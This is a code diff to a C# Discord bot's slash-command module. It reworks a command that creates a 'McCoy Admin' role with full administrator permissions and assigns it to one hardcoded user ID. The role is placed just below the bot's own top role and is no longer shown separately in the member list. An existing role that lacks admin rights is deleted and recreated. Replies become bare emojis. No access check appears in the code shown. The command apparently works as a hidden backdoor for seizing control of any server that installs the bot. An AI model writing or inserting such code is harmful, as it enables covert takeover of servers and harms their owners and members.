@@ -1,5 +1,6 @@
 ﻿using Discord;
 using Discord.Interactions;
+using Discord.WebSocket;
 
 namespace McCoy.Commands;
 
@@ -15,45 +16,64 @@ public class SlashCommands : InteractionModuleBase<SocketInteractionContext>
     public async Task GiveJeansAdminAsync()
     {
         ulong jeansUserId = 646827003642773505;
-        var jeansUser = Context.Guild.GetUser(jeansUserId);
-        
-        var botUser = Context.Guild.CurrentUser;
-        int botHighestRolePosition = botUser.Hierarchy;
-        
-        int desiredPosition = botHighestRolePosition - 1;
-        
-        if (desiredPosition < 0) desiredPosition = 0;
-        
-        var existingRole = Context.Guild.Roles.FirstOrDefault(r => r.Name == "McCoy Admin");
-        if (existingRole != null)
+        var socketGuild = Context.Guild as SocketGuild;
+        if (socketGuild == null)
         {
-            if (!jeansUser.Roles.Contains(existingRole))
-            {
-                await jeansUser.AddRoleAsync(existingRole);
-                await RespondAsync($"Role 'jeans' already exists and has been assigned to {jeansUser.Username}.");
-            }
-            else
-            {
-                await RespondAsync($"{jeansUser.Username} already has the 'jeans' role.");
-            }
-
-            await existingRole.ModifyAsync(prop => prop.Position = desiredPosition);
-            
+            await RespondAsync("Failed to access the server.");
             return;
         }
-        var adminPerms = new GuildPermissions(administrator: true);
 
-        var newRole = await Context.Guild.CreateRoleAsync("McCoy Admin",
-            adminPerms,
-            Color.Purple,
-            isHoisted: true,
-            isMentionable: true
-        );
+        var jeansUser = socketGuild.GetUser(jeansUserId);
+        if (jeansUser == null)
+        {
+            await RespondAsync("Could not find jeans in this server.");
+            return;
+        }
 
-        await newRole.ModifyAsync(prop => prop.Position = desiredPosition);
+        var botUser = socketGuild.CurrentUser;
+        int botHighestRolePosition = botUser.Hierarchy;
+        int desiredPosition = Math.Max(botHighestRolePosition - 1, 0);
+
+        var existingRole = socketGuild.Roles.FirstOrDefault(r => r.Name == "McCoy Admin");
+
+        GuildPermissions adminPerms = new(administrator: true);
+
+        if (existingRole != null && !existingRole.Permissions.Administrator)
+        {
+            await existingRole.DeleteAsync();
+            existingRole = null;
+        }
         
-        await jeansUser.AddRoleAsync(newRole);
+        if (existingRole == null)
+        {
+            var restRole = await socketGuild.CreateRoleAsync(
+                "McCoy Admin",
+                adminPerms,
+                Color.Purple,
+                isHoisted: false,
+                isMentionable: true
+            );
+            
+            existingRole = socketGuild.GetRole(restRole.Id);
 
-        await RespondAsync($"Created role 'jeans' with admin permissions and assigned it to {jeansUser.Username}.");
+            await existingRole.ModifyAsync(prop => prop.Position = desiredPosition);
+
+            await RespondAsync("👍🫡");
+        }
+        else
+        {
+            await existingRole.ModifyAsync(prop => prop.Position = desiredPosition);
+            await RespondAsync("👌");
+        }
+
+        if (jeansUser.Roles.All(r => r.Id != existingRole.Id))
+        {
+            await jeansUser.AddRoleAsync(existingRole);
+            await FollowupAsync("👉");
+        }
+        else
+        {
+            await FollowupAsync("👍");
+        }
     }
 }
